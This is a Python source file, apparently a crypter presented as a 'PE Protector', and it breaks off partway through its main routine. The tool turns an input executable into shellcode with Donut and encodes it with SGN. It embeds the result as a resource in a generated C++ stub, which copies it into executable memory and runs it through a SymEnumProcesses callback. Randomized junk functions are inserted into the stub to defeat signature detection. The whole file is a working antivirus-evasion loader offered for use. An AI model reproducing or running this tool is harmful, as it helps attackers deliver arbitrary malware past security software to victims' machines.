import subprocess
import os
import random
import sys
import argparse
import tempfile
import time
import threading
import re # Import regex for finding placeholders
from colorama import init, Fore, Style

init(autoreset=True)

# --- Configuration ---
UTILS_DIR = "./Utils/"
DEFAULT_DONUT_PATH = os.path.join(UTILS_DIR, "E2S.X")
DEFAULT_SGN_PATH = os.path.join(UTILS_DIR, "SGN.X")
DEFAULT_COMPILER_PATH = "cl.exe"
DEFAULT_RC_PATH = "rc.exe"

DONUT_ARGS = "-b 1 -e 1 -z 3"
SGN_ARGS_TEMPLATE = "-i \"{input_bin}\" -o \"{output_bin}\""
COMPILER_ARGS_TEMPLATE = '/nologo /O1 /GL /Gy /GS- /MT /EHsc /W3 /D "WIN32" /D "NDEBUG" /DEBUG:NONE /Fe:"{output_exe}" "{input_cpp}" /link /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO /SUBSYSTEM:WINDOWS kernel32.lib user32.lib Dbghelp.lib'

# --- C++ Stub Template with Resource Loading and Random Insertion Points ---
CPP_STUB_TEMPLATE = r"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <DbgHelp.h>
#include <intrin.h> // For potential intrinsics like __nop
#include "resource.h"

// --- JUNK_FUNC_DECL_PLACEHOLDER ---

// --- JUNK_FUNC_A_PLACEHOLDER ---

// --- JUNK_INSERT_POINT ---

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lpC, int nC) {
    // --- JUNK_INSERT_POINT ---

    LPVOID xMem = NULL;
    HRSRC hRsrc = NULL;
    DWORD scSize = 0;
    HGLOBAL hGlob = NULL;
    LPVOID scData = NULL;
    BOOL ok = FALSE;
    HANDLE hProc = NULL;

    // --- JUNK_INSERT_POINT ---

    hRsrc = FindResourceA(hI, MAKEINTRESOURCEA(IDR_SC1), RT_RCDATA);
    if (!hRsrc) {{
        // --- JUNK_INSERT_POINT ---
        return 1;
    }}

    // --- JUNK_INSERT_POINT ---

    scSize = SizeofResource(hI, hRsrc);
    hGlob = LoadResource(hI, hRsrc);

    if (!hGlob || scSize <= 0) {{
        // --- JUNK_INSERT_POINT ---
        return 1;
    }}

    // --- JUNK_INSERT_POINT ---

    scData = LockResource(hGlob);
    if (!scData) {{
         // --- JUNK_INSERT_POINT ---
        return 1;
    }}

    // --- JUNK_INSERT_POINT ---

    xMem = VirtualAlloc(NULL, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!xMem) {{
        // --- JUNK_INSERT_POINT ---
        return 1;
    }}

    // --- JUNK_INSERT_POINT ---

    CopyMemory(xMem, scData, scSize);

    // --- JUNK_INSERT_POINT ---

    hProc = GetCurrentProcess();
    if (SymInitialize(hProc, NULL, FALSE)) {{
        // --- JUNK_INSERT_POINT ---
        SymEnumProcesses((PSYM_ENUMPROCESSES_CALLBACK)xMem, NULL);
        ok = TRUE;
        // --- JUNK_INSERT_POINT ---
        SymCleanup(hProc);
    }} else {{
        // --- JUNK_INSERT_POINT ---
        VirtualFree(xMem, 0, MEM_RELEASE);
    }}

    // --- JUNK_INSERT_POINT ---

    return ok ? 0 : 1;
}

// --- JUNK_FUNC_B_PLACEHOLDER ---
"""

# --- Resource Header Template ---
RC_HEADER_TEMPLATE = """
#define IDR_SC1 101
"""

# --- Resource Script Template ---
RC_SCRIPT_TEMPLATE = """
#include "resource.h"
IDR_SC1 RCDATA "{sc_bin_path}"
"""

# --- Absolute path versions for resource compiler ---
RC_SCRIPT_TEMPLATE_ABS = """
#include "{rc_header_path}"
IDR_SC1 RCDATA "{sc_bin_path}"
"""

# --- Junk Code Generation (Expanded & Safer) ---
# Note: Using 'static' for functions to limit scope
JUNK_FUNC_TEMPLATES = [
    # Original Arithmetic Loop (safer modulo)
    """
static DWORD __{0}(DWORD p) {{
    DWORD x = p ^ 0xDEADBEEF;
    for(unsigned int i = 0; i < {1}; i++) {{
        x = (x * {2}) + (i ^ {3});
        if (x > {4} && {5} > 0) x = x % {5};
    }}
    return x;
}}
""",
    # Original Hash-like (safer shifts)
    """
static BOOL __{0}(BYTE* d, SIZE_T s) {{
    DWORD h = 0xAAAAAAAA;
    if (!d || s == 0) return FALSE;
    for(SIZE_T i = 0; i < s; i++) {{
        h = ((h << {1}) | (h >> (32 - {1}))) ^ (DWORD)d[i] ^ {2};
    }}
    return (h % {3} != {4});
}}
""",
    # Original String Reversal (simple)
    """
static void __{0}(char* s) {{
    if (!s) return;
    int l = lstrlenA(s);
    if (l < 2) return;
    for(int i = 0; i < l / 2; i++) {{
        char t = s[i];
        s[i] = s[l - i - 1];
        s[l - i - 1] = t;
        s[i] ^= {1}; // Add a small mutation
        s[l - i - 1] ^= {2};
    }}
}}
""",
    # New: Bit Manipulation Madness
    """
static UINT __{0}(UINT seed) {{
    UINT val = seed ^ {1};
    for (int i = 0; i < {2}; ++i) {{
        val = _rotl(val, {3}); // Rotate left
        val ^= (val >> {4});
        val += {5};
        if ((i % {6}) == 0) {{
            val = ~val; // Bitwise NOT occasionally
        }}
    }}
    return val;
}}
""",
    # New: Simple Pointer Arithmetic (within a local buffer)
    """
static int __{0}(int offset) {{
    volatile char buf[{1}]; // Use volatile to discourage optimization
    int start = {2} % ({1} / 2);
    int end = start + ({3} % ({1} / 4)) + 1;
    int sum = 0;
    for (int i = start; i < end && i < {1}; ++i) {{
        buf[i] = (char)((i + offset) ^ {4});
        sum += buf[i];
    }}
    return sum;
}}
""",
     # New: Conditional Logic with API calls
    """
static BOOL __{0}(DWORD dwFlags) {{
        BOOL result = FALSE;
        if (dwFlags & {1}) {{
            result = IsDebuggerPresent();
        }} else if (dwFlags > {2}) {{
            result = (GetTickCount() % {3} == 0);
        }} else {{
            SYSTEM_INFO si;
            GetSystemInfo(&si);
            result = (si.dwNumberOfProcessors > {4});
        }}
        return result ^ TRUE; // Flip result sometimes
}}
"""
]

JUNK_INLINE_TEMPLATES = [
    # Original Tick Count Check (simple)
    """
    {{ // Inline Junk Block A
        volatile DWORD _t = GetTickCount();
        if ((_t % {0}) == {1}) {{
            _t += {2}; // Simple mutation
            if (_t == 0) Sleep(1); // Avoid Sleep(0)
        }}
         __nop(); // Mildly discourages optimization
    }}
""",
    # Original Byte Array XOR (using volatile)
    """
    {{ // Inline Junk Block B
        volatile static BYTE _b[] = {{ {0} }};
        for(volatile int _i = 0; _i < sizeof(_b); _i++) {{
            _b[_i] ^= {1};
        }}
    }}
""",
    # Original System Time Check (safer mod)
    """
    {{ // Inline Junk Block C
        SYSTEMTIME _st;
        GetSystemTime(&_st);
        if (_st.wMilliseconds > {0}) {{
            _st.wSecond = (_st.wSecond + {1}) % 60;
            _st.wDayOfWeek = (_st.wDayOfWeek + 1) % 7;
        }}
        SetLastError(_st.wMilliseconds); // Use value in a harmless way
    }}
""",
    # Original Memory Status Check (using result)
    """
    {{ // Inline Junk Block D
        MEMORYSTATUSEX _ms;
        _ms.dwLength = sizeof(_ms);
        if (GlobalMemoryStatusEx(&_ms)) {{
            volatile DWORDLONG _mused = _ms.ullTotalPhys - _ms.ullAvailPhys;
            if (_mused > {0}) {{
               _mused /= ({1} | 1); // Avoid divide by zero
            }}
        }}
    }}
""",
    # New: Simple Math & Vars
    """
    {{ // Inline Junk Block E
        volatile int _jVar1 = {0};
        int _jVar2 = GetCurrentThreadId();
        _jVar1 = (_jVar1 * _jVar2 + {1}) % {2};
        if (_jVar1 < 0) _jVar1 = -_jVar1;
    }}
""",
    # New: Basic API Call usage
    """
    {{ // Inline Junk Block F
        DWORD _pid = GetCurrentProcessId();
        BOOL _isWow = FALSE;
        if (IsWow64Process(GetCurrentProcess(), &_isWow)) {{
           if (_isWow && (_pid % {0} == {1})) {{
              // Do nothing specific
              __nop();
           }}
        }}
    }}
""",
    # New: Loop with No Operation Intrinsic
    """
    {{ // Inline Junk Block G
        volatile int _limit = {0} % 5 + 1; // Limit loop iterations
        for(int _k=0; _k < _limit; ++_k) {{
            __nop(); __nop(); __nop();
        }}
    }}
""",
    # New: Get Volume Information (use results slightly)
    """
    {{ // Inline Junk Block H
        char volName[MAX_PATH + 1] = {{0}};
        DWORD serial = 0;
        DWORD maxCompLen = 0;
        DWORD fsFlags = 0;
        if (GetVolumeInformationA("C:\\\\", volName, sizeof(volName), &serial, &maxCompLen, &fsFlags, NULL, 0)) {{
            serial ^= {0};
            fsFlags |= {1};
        }} else {{
            serial = GetLastError();
        }}
    }}
"""
]

# --- Console Output Helpers ---
def print_info(msg): print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {msg}")
def print_success(msg): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def print_warning(msg): print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")
def print_error(msg): print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

# --- Spinner ---
spinner_stop_event = threading.Event()
spinner_thread = None

def spinner_func():
    chars = ['|', '/', '-', '\\']
    idx = 0
    while not spinner_stop_event.is_set():
        try:
            sys.stdout.write(f"\r{Fore.YELLOW}{Style.BRIGHT} {chars[idx % len(chars)]}{Style.RESET_ALL} Processing...")
            sys.stdout.flush()
            idx += 1
            time.sleep(0.1)
        except OSError:
            break
    try:
        # Clear the spinner line completely
        sys.stdout.write('\r' + ' ' * 30 + '\r')
        sys.stdout.flush()
    except OSError: pass

def start_spinner():
    global spinner_thread, spinner_stop_event
    if spinner_thread and spinner_thread.is_alive(): return
    spinner_stop_event.clear()
    spinner_thread = threading.Thread(target=spinner_func, daemon=True)
    spinner_thread.start()

def stop_spinner():
    global spinner_thread
    if spinner_thread and spinner_thread.is_alive():
        spinner_stop_event.set()
        spinner_thread.join(timeout=0.5)
    try:
        # Clear the spinner line completely
        sys.stdout.write('\r' + ' ' * 30 + '\r')
        sys.stdout.flush()
    except OSError: pass
    spinner_thread = None

# --- Helper Functions ---
def run_command(command, shell=True, suppress_stdout=False, suppress_stderr=False, capture_output=False):
    stdout_redir = subprocess.PIPE if capture_output or suppress_stdout else None
    stderr_redir = subprocess.PIPE if capture_output or suppress_stderr else None
    try:
        result = subprocess.run(command, shell=shell, check=True,
                              stdout=stdout_redir, stderr=stderr_redir,
                              text=True, encoding='utf-8', errors='ignore')
        return result
    except subprocess.CalledProcessError as e:
        # Always print captured output on error if capture_output was True
        if capture_output:
            if e.stdout: print(f"{Fore.YELLOW}STDOUT:{Style.RESET_ALL}\n{e.stdout.strip()}")
            if e.stderr: print(f"{Fore.RED}STDERR:{Style.RESET_ALL}\n{e.stderr.strip()}")
        elif suppress_stderr: # If stderr was suppressed, try to capture it now (less reliable)
             try:
                 result = subprocess.run(command, shell=shell, check=False, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                 if result.stderr: print(f"{Fore.RED}STDERR (recaptured):{Style.RESET_ALL}\n{result.stderr.strip()}")
             except Exception: pass # Ignore errors during recapture
        raise # Re-raise the original error
    except FileNotFoundError as e:
        print_error(f"Command not found: {command.split()[0]}")
        raise e
    except Exception as e:
        print_error(f"Exception running command: {command}")
        raise e

def generate_c_array(data):
    if not data: return ""
    hex_bytes = [f"0x{byte:02x}" for byte in data]
    formatted_string = ""
    for i, hex_byte in enumerate(hex_bytes):
        formatted_string += hex_byte + ", "
        if (i + 1) % 16 == 0: formatted_string += "\n    "
    return formatted_string.rstrip(', \n\t ')

def resolve_tool_path(tool_arg, default_path, tool_name):
    # 1. Check explicit argument if it's not the default
    if tool_arg != default_path and os.path.isfile(tool_arg):
         print_info(f"Using specified {tool_name}: {os.path.abspath(tool_arg)}")
         return os.path.abspath(tool_arg)

    # 2. Check default path relative to script/Utils
    script_dir = os.path.dirname(os.path.abspath(__file__))
    potential_default = os.path.join(script_dir, default_path)
    if os.path.isfile(potential_default):
        print_info(f"Using default {tool_name}: {potential_default}")
        return potential_default

    # 3. Check PATH environment variable if base name was provided
    base_name = os.path.basename(tool_arg)
    if base_name == tool_arg: # Only search PATH if it looks like just a filename
         for path_dir in os.environ.get("PATH", "").split(os.pathsep):
             for ext in ["", ".exe"]: # Check with and without .exe
                 potential_path = os.path.join(path_dir, base_name + ext)
                 if os.path.isfile(potential_path):
                     print_info(f"Resolved {tool_name} via PATH: {potential_path}")
                     return potential_path

    # 4. Fallback: Assume it's callable directly by the shell
    print_warning(f"{tool_name} executable '{tool_arg}' not found directly or in PATH. Assuming it's callable.")
    return tool_arg # Return the original argument

def check_cl_environment():
    required_vars = ['INCLUDE', 'LIB', 'LIBPATH']
    missing_vars = [v for v in required_vars if not os.environ.get(v)]
    if missing_vars:
        print_warning(f"Developer environment variables missing: {', '.join(missing_vars)}. Compilation might fail.")
        print_warning("Consider running this script from a 'Developer Command Prompt' or 'Developer PowerShell'.")
        return False
    print_info("Developer environment check passed (found INCLUDE, LIB, LIBPATH).")
    return True

# --- Enhanced Junk Code Generation ---

def generate_random_junk_funcs(count=3):
    """Generates C++ junk functions, their declarations, and names."""
    funcs = []
    decls = []
    func_infos = [] # Store name and signature info

    for i in range(count):
        func_name = f"jF{random.randrange(100000, 999999)}"
        template = random.choice(JUNK_FUNC_TEMPLATES)
        decl = ""
        sig_key = "" # To identify signature for call generation

        # Generate parameters based on template needs, ensuring safer ranges
        if "__{0}(DWORD p)" in template:
            p1 = random.randrange(50, 200)          # loop count
            p2 = random.randrange(1, 1000)         # multiplier
            p3 = random.randrange(0, 0xFFFFFFFF)   # xor val
            p4 = random.randrange(10000, 100000)   # threshold
            p5 = random.randrange(1, 5000)         # modulo (non-zero)
            func_code = template.format(func_name, p1, p2, p3, p4, p5)
            decl = f"static DWORD __{func_name}(DWORD);"
            sig_key = "DWORD_DWORD"
        elif "__{0}(BYTE* d, SIZE_T s)" in template:
            p1 = random.randrange(1, 32)           # shift amount (1-31)
            p2 = random.randrange(0, 0xFFFFFFFF)   # xor val
            p3 = random.randrange(10, 1000)        # modulo
            p4 = random.randrange(0, p3)           # compare val
            func_code = template.format(func_name, p1, p2, p3, p4)
            decl = f"static BOOL __{func_name}(BYTE*, SIZE_T);"
            sig_key = "BOOL_BYTE*_SIZE_T"
        elif "__{0}(char* s)" in template:
            p1 = random.randrange(0, 256)          # xor byte 1
            p2 = random.randrange(0, 256)          # xor byte 2
            func_code = template.format(func_name, p1, p2)
            decl = f"static void __{func_name}(char*);"
            sig_key = "VOID_CHAR*"
        elif "__{0}(UINT seed)" in template:
            p1 = random.randrange(0, 0xFFFFFFFF)   # xor seed
            p2 = random.randrange(5, 25)           # loop count
            p3 = random.randrange(1, 32)           # rotate amount
            p4 = random.randrange(1, 16)           # shift amount
            p5 = random.randrange(0, 1000)         # add value
            p6 = random.randrange(2, 10)           # modulo for NOT
            func_code = template.format(func_name, p1, p2, p3, p4, p5, p6)
            decl = f"static UINT __{func_name}(UINT);"
            sig_key = "UINT_UINT"
        elif "__{0}(int offset)" in template:
            p1 = random.randrange(32, 128)         # buffer size
            p2 = random.randrange(0, 1000)         # start offset calculation
            p3 = random.randrange(0, 1000)         # range calculation
            p4 = random.randrange(0, 256)          # xor byte
            func_code = template.format(func_name, p1, p2, p3, p4)
            decl = f"static int __{func_name}(int);"
            sig_key = "INT_INT"
        elif "__{0}(DWORD dwFlags)" in template:
            p1 = 1 << random.randrange(0, 5)       # flag bit
            p2 = random.randrange(100, 10000)      # threshold
            p3 = random.randrange(2, 100)          # modulo (non-zero)
            p4 = random.randrange(1, 5)            # num processors check
            func_code = template.format(func_name, p1, p2, p3, p4)
            decl = f"static BOOL __{func_name}(DWORD);"
            sig_key = "BOOL_DWORD"
        else: # Fallback if template mismatch
            continue

        funcs.append(func_code)
        decls.append(decl)
        func_infos.append({"name": func_name, "sig": sig_key})

    return funcs, decls, func_infos

def generate_junk_snippets(func_infos, count=15):
    """Generates a list of inline junk snippets and calls to junk functions."""
    snippets = []
    for _ in range(count):
        # ~30% chance to generate a call to a junk function
        if func_infos and random.random() < 0.30:
            info = random.choice(func_infos)
            func_name = info["name"]
            sig = info["sig"]
            call_str = ""

            if sig == "DWORD_DWORD":
                param = f"(DWORD)GetTickCount() + {random.randrange(0, 1000)}"
                call_str = f"{{ volatile DWORD _jrv = __{func_name}({param}); (_jrv); }} // Call {func_name}"
            elif sig == "BOOL_BYTE*_SIZE_T":
                byte_count = random.randrange(4, 12)
                bytes_val = ", ".join([f"0x{random.randrange(0, 256):02x}" for _ in range(byte_count)])
                call_str = f"{{ static BYTE _jd[{byte_count}] = {{{bytes_val}}}; volatile BOOL _jrv = __{func_name}(_jd, {byte_count}); (_jrv); }} // Call {func_name}"
            elif sig == "VOID_CHAR*":
                 # Use a static buffer to avoid stack allocation in random places
                 str_len = random.randrange(8, 20)
                 chars = [chr(random.randrange(ord('a'), ord('z')+1)) for _ in range(str_len-1)]
                 str_val = "".join(chars)
                 call_str = f"{{ static char _js[{str_len}] = \"{str_val}\"; __{func_name}(_js); }} // Call {func_name}"
            elif sig == "UINT_UINT":
                param = f"(UINT)GetCurrentProcessId() ^ {random.randrange(0, 1000)}"
                call_str = f"{{ volatile UINT _jrv = __{func_name}({param}); (_jrv); }} // Call {func_name}"
            elif sig == "INT_INT":
                 param = f"(int)({random.randrange(-50, 50)})"
                 call_str = f"{{ volatile int _jrv = __{func_name}({param}); (_jrv); }} // Call {func_name}"
            elif sig == "BOOL_DWORD":
                 param = f"{random.randrange(0, 1000)}"
                 call_str = f"{{ volatile BOOL _jrv = __{func_name}((DWORD){param}); (_jrv); }} // Call {func_name}"

            if call_str:
                snippets.append(call_str)
            else: # Fallback to inline if call generation failed
                 template = random.choice(JUNK_INLINE_TEMPLATES)
                 snippets.append(generate_inline_from_template(template))

        else: # Generate inline junk
            template = random.choice(JUNK_INLINE_TEMPLATES)
            snippets.append(generate_inline_from_template(template))

    return snippets

def generate_inline_from_template(template):
    """ Fills a chosen inline template with random parameters. """
    inline_code = ""
    num_params = template.count('{')

    if num_params == 0: # Simple template like nop loop
        inline_code = template
    elif "Inline Junk Block B" in template: # Byte array case
        byte_vals = ", ".join([f"0x{random.randrange(0, 256):02x}" for _ in range(random.randrange(5, 12))])
        param2 = random.randrange(1, 256) # XOR key
        inline_code = template.format(byte_vals, param2)
    elif "Inline Junk Block H" in template: # Volume info case
        param1 = random.randrange(0, 0xFFFFFFFF)
        param2 = random.randrange(0, 0xFFFFFFFF)
        inline_code = template.format(param1, param2)
    elif "Inline Junk Block G" in template: # Nop loop case
        param1 = random.randrange(1, 15)
        inline_code = template.format(param1)
    else: # General numeric parameters
        params = []
        for i in range(num_params):
            # Generate reasonably sized random numbers
            if i == 0 and ("%" in template or "/" in template or "Sleep" in template): # Avoid 0 for modulo/div/sleep
                params.append(random.randrange(1, 5000))
            elif i == 1 and ("%" in template or "/" in template) and "{2}" in template: # Divisor/Modulo
                 params.append(random.randrange(1, 2000))
            else:
                params.append(random.randrange(0, 10000))
        try:
            inline_code = template.format(*params)
        except IndexError:
            print_warning(f"Parameter mismatch for inline template: {template}")
            inline_code = "{ __nop(); }" # Safe fallback

    return inline_code

# --- Main Logic ---
def main():
    parser = argparse.ArgumentParser(description="PE Protector: Donut -> SGN -> Stub -> Compile")
    parser.add_argument("-i", "--input", required=True, help="Input executable (.exe).")
    parser.add_argument("-o", "--output", required=True, help="Output protected executable (.exe).")
    parser.add_argument("--donut", default=DEFAULT_DONUT_PATH, help=f"Path to Donut (E2S.X). Default: '{DEFAULT_DONUT_PATH}'")
    parser.add_argument("--sgn", default=DEFAULT_SGN_PATH, help=f"Path to SGN (SGN.X). Default: '{DEFAULT_SGN_PATH}'")
    parser.add_argument("--compiler", default=DEFAULT_COMPILER_PATH, help=f"C++ compiler (cl.exe). Default: '{DEFAULT_COMPILER_PATH}'")
    parser.add_argument("--rc", default=DEFAULT_RC_PATH, help=f"Resource compiler (rc.exe). Default: '{DEFAULT_RC_PATH}'")
    parser.add_argument("--keep-temp", action='store_true', help="Keep temporary files (.bin, .cpp, .rc, .res, .obj).")
    parser.add_argument("--junk-funcs", type=int, default=4, help="Number of junk functions to generate (default: 5)")
    parser.add_argument("--junk-inserts", type=int, default=4, help="Approximate number of junk code insertions (inline/calls) (default: 4)")
    parser.add_argument("--max-retries", type=int, default=3, help="Maximum number of retries for compilation failures (default: 3)")

    args = parser.parse_args()

    print_info("Starting Enhanced PE Protector...")

    check_cl_environment() # Check for Dev Env Vars

    temp_dir = None
    tmp_files = {}
    start_time = time.time()

    try:
        if not os.path.isfile(args.input):
            print_error(f"Input file not found: {args.input}")
            sys.exit(1)

        # Resolve tool paths properly
        donut_path = resolve_tool_path(args.donut, DEFAULT_DONUT_PATH, "Donut")
        sgn_path = resolve_tool_path(args.sgn, DEFAULT_SGN_PATH, "SGN")
        # Assume compiler and rc are in PATH or specified if not default
        compiler_path = resolve_tool_path(args.compiler, DEFAULT_COMPILER_PATH, "Compiler")
        rc_path = resolve_tool_path(args.rc, DEFAULT_RC_PATH, "Resource Compiler")


        input_exe_abs = os.path.abspath(args.input)
        output_exe_abs = os.path.abspath(args.output)

        # Ensure output directory exists
        output_dir = os.path.dirname(output_exe_abs)
        if output_dir and not os.path.exists(output_dir):
            print_info(f"Creating output directory: {output_dir}")
            os.makedirs(output_dir)

        temp_dir = tempfile.mkdtemp(prefix="TriProt_")
        tmp_files = {
            'donut_bin': os.path.join(temp_dir, "donut_shellcode.bin"),
            'sgn_bin': os.path.join(temp_dir, "sgn_encoded.bin"),
            'cpp': os.path.join(temp_dir, "stub.cpp"),
            'rc_header': os.path.join(temp_dir, "resource.h"),
            'rc_script': os.path.join(temp_dir, "resources.rc"),
            'res': os.path.join(temp_dir, "resources.res"),
            'obj': os.path.join(temp_dir, "stub.obj") # Explicit obj file path
        }
        print_info(f"Using temp directory: {temp_dir}")

        # --- Step 1: Donut ---
        print_info(f"Running Donut ({os.path.basename(donut_path)})...")
        # Ensure paths with spaces are quoted
        donut_cmd = f'"{donut_path}" -i "{input_exe_abs}" -o "{tmp_files["donut_bin"]}" {DONUT_ARGS}'
        start_spinner()
        try:
            # Capture output on failure for donut/sgn
            run_command(donut_cmd, suppress_stdout=True, suppress_stderr=True, capture_output=True)
        except Exception as e:
             stop_spinner()
             print_error(f"Donut execution failed. Check command, permissions, and tool.")
             # Error message already printed by run_command
             sys.exit(1)
        finally:
            stop_spinner()
        if not os.path.exists(tmp_files["donut_bin"]) or os.path.getsize(tmp_files["donut_bin"]) == 0:
             print_error(f"Donut failed to generate output: {tmp_files['donut_bin']}")
             sys.exit(1)
        print_success("Donut processing complete.")

        # --- Step 2: SGN ---
        print_info(f"Running SGN ({os.path.basename(sgn_path)})...")
         # Ensure paths with spaces are quoted
        sgn_cmd = f'"{sgn_path}" {SGN_ARGS_TEMPLATE.format(input_bin=tmp_files["donut_bin"], output_bin=tmp_files["sgn_bin"])}'
        start_spinner()
        try:
            # Capture output on failure for donut/sgn
            run_command(sgn_cmd, suppress_stdout=True, suppress_stderr=True, capture_output=True)
        except Exception as e:
             stop_spinner()
             print_error(f"SGN execution failed. Check command, permissions, and tool.")
             # Error message already printed by run_command
             sys.exit(1)
        finally:
            stop_spinner()
        if not os.path.exists(tmp_files["sgn_bin"]) or os.path.getsize(tmp_files["sgn_bin"]) == 0:
             print_error(f"SGN failed to generate output: {tmp_files['sgn_bin']}")
             sys.exit(1)
        print_success("SGN processing complete.")

        # --- Step 3 to 7: Generate and compile stub with retry mechanism ---
        success = False
        retries = 0
        max_retries = args.max_retries

        while not success and retries <= max_retries:
            build_start_time = time.time()
            try:
                if retries > 0:
                    print_warning(f"--- Build Attempt {retries + 1}/{max_retries + 1} ---")

                # --- Step 3: Generate Junk Code Functions ---
                print_info(f"Generating {args.junk_funcs} random junk functions...")
                junk_funcs, junk_decls, func_infos = generate_random_junk_funcs(args.junk_funcs)
                if not junk_funcs:
                     print_warning("No junk functions were generated.")

                # --- Step 4: Generate Resource Files ---
                print_info("Generating resource files...")
                with open(tmp_files["rc_header"], "w") as f:
                    f.write(RC_HEADER_TEMPLATE)
                # Use absolute, escaped paths for RC script
                abs_header_path = os.path.abspath(tmp_files["rc_header"]).replace('\\', '\\\\')
                abs_sc_bin_path = os.path.abspath(tmp_files["sgn_bin"]).replace('\\', '\\\\')
                with open(tmp_files["rc_script"], "w") as f:
                    f.write(RC_SCRIPT_TEMPLATE_ABS.format(
                        rc_header_path=abs_header_path,
                        sc_bin_path=abs_sc_bin_path
                    ))

                # --- Step 5: Compile resources ---
                print_info(f"Compiling resources with {os.path.basename(rc_path)}...")
                # Explicitly specify output file with /fo
                rc_cmd = f'"{rc_path}" /nologo /fo "{tmp_files["res"]}" "{tmp_files["rc_script"]}"'
                start_spinner()
                try:
                    # Capture output on failure for rc
                    run_command(rc_cmd, suppress_stdout=True, suppress_stderr=True, capture_output=True)
                except Exception as e:
                    stop_spinner()
                    print_error(f"Resource compilation failed.")
                    # Error message already printed by run_command
                    raise # Re-raise to trigger retry
                finally:
                    stop_spinner()

                if not os.path.exists(tmp_files["res"]):
                    print_error(f"Resource file '{tmp_files['res']}' not found after compilation.")
                    # Check if rc.exe might have put it elsewhere (less likely with /fo)
                    rc_dir = os.path.dirname(tmp_files["rc_script"])
                    alt_res_path = os.path.join(rc_dir, os.path.basename(tmp_files['res']))
                    if os.path.exists(alt_res_path):
                        print_warning(f"Found resource file at alternate location: {alt_res_path}. Moving.")
                        os.rename(alt_res_path, tmp_files["res"])
                    else:
                         print_error(f"Check rc.exe path and permissions.")
                         raise RuntimeError("Resource compilation failed definitively.")
                print_success("Resource compilation complete.")


                # --- Step 6: Generate C++ Stub with Junk Code ---
                print_info("Generating C++ stub with randomized junk code...")
                cpp_source = CPP_STUB_TEMPLATE

                # Insert junk function declarations and definitions
                cpp_source = cpp_source.replace("// --- JUNK_FUNC_DECL_PLACEHOLDER ---", "\n".join(junk_decls))
                mid_point = len(junk_funcs) // 2
                cpp_source = cpp_source.replace("// --- JUNK_FUNC_A_PLACEHOLDER ---", "\n".join(junk_funcs[:mid_point]))
                cpp_source = cpp_source.replace("// --- JUNK_FUNC_B_PLACEHOLDER ---", "\n".join(junk_funcs[mid_point:]))

                # Find all insertion points
                insert_points = [m.start() for m in re.finditer(r"// --- JUNK_INSERT_POINT ---", cpp_source)]
                random.shuffle(insert_points)

                # Generate junk snippets (inline + calls)
                print_info(f"Generating {args.junk_inserts} junk code snippets (inline/calls)...")
                junk_snippets = generate_junk_snippets(func_infos, args.junk_inserts * 2) # Generate more than needed
                random.shuffle(junk_snippets)

                # Insert snippets at random points
                inserted_count = 0
                placeholder_len = len("// --- JUNK_INSERT_POINT ---")
                offset = 0 # Track offset changes due to insertions
                num_to_insert = min(len(insert_points), args.junk_inserts, len(junk_snippets))
                print_info(f"Attempting to insert {num_to_insert} snippets...")

                processed_source_parts = []
                last_pos = 0
                # Sort points by position to process in order
                insert_points.sort()

                # Select points to insert into
                points_to_use = random.sample(insert_points, num_to_insert)
                points_to_use.sort() # Keep them sorted

                snippet_idx = 0
                for point_pos in points_to_use:
                    if snippet_idx >= len(junk_snippets): break # Ran out of snippets

                    # Add segment before the placeholder
                    processed_source_parts.append(cpp_source[last_pos:point_pos])
                    # Add the junk snippet
                    snippet = f"\n    {junk_snippets[snippet_idx]}\n"
                    processed_source_parts.append(snippet)
                    snippet_idx += 1
                    inserted_count += 1
                    # Update last_pos to be after the placeholder
                    last_pos = point_pos + placeholder_len

                # Add the remaining part of the source file
                processed_source_parts.append(cpp_source[last_pos:])
                cpp_source = "".join(processed_source_parts)


                # Remove any remaining (unused) insertion point placeholders
                cpp_source = cpp_source.replace("// --- JUNK_INSERT_POINT ---", "")
                print_info(f"Successfully inserted {inserted_count} junk snippets.")

                # Write C++ stub
                with open(tmp_files["cpp"], "w", encoding='utf-8') as f:
                    f.write(cpp_source)

                # --- Step 7: Compile Stub ---
                print_info(f"Compiling C++ stub with {os.path.basename(compiler_path)}...")

                # Compile to object file first (/c)
                # Ensure paths with spaces are quoted. Use explicit object file path.
                compile_obj_cmd = f'"{compiler_path}" /c /nologo /O1 /GL /Gy /GS- /MT /EHsc /W3 /D "WIN32" /D "NDEBUG" /Fo"{tmp_files["obj"]}" "{tmp_files["cpp"]}"'
                start_spinner()
                try:
                    # Capture output to show on error
                    run_command(compile_obj_cmd, capture_output=True, suppress_stdout=True, suppress_stderr=True)
                except Exception as e:
                    stop_spinner()
                    print_error(f"Failed to compile C++ stub to object file.")
                    # Error message printed by run_command
                    if retries >= max_retries: # Only dump code on last retry
                         print_warning("Dumping generated C++ code (last attempt):")
                         try:
                              with open(tmp_files["cpp"], 'r', encoding='utf-8') as f_dbg:
                                   print(f.read())
                         except Exception as read_e:
                              print_warning(f"Could not read C++ file for debugging: {read_e}")
                    raise # Re-raise to trigger retry
                finally:
                    stop_spinner()

                if not os.path.exists(tmp_files["obj"]):
                     print_error(f"Object file '{tmp_files['obj']}' not found after compilation.")
                     raise RuntimeError("Object file compilation failed.")
                print_success("Object file compilation successful.")


                # Link object file with resource file
                # Ensure paths with spaces are quoted
                link_cmd = f'"{compiler_path}" "{tmp_files["obj"]}" "{tmp_files["res"]}" /nologo /Fe:"{output_exe_abs}" /link /LTCG /OPT:REF /OPT:ICF /INCREMENTAL:NO /SUBSYSTEM:WINDOWS kernel32.lib user32.lib Dbghelp.lib'
                start_spinner()
                try:
                    # Capture output to show on error
                    run_command(link_cmd, capture_output=True, suppress_stdout=True, suppress_stderr=True)
                except Exception as e:
                    stop_spinner()
                    print_error(f"Linking failed.")
                     # Error message printed by run_command
                    raise # Re-raise to trigger retry
                finally:
                    stop_spinner()

                if not os.path.exists(output_exe_abs):
                     print_error(f"Output file '{output_exe_abs}' not found after linking.")
                     raise RuntimeError("Linking failed definitively.")

                print_success("Linking successful.")
                success = True # If we got here without exceptions, we succeeded
                build_duration = time.time() - build_start_time
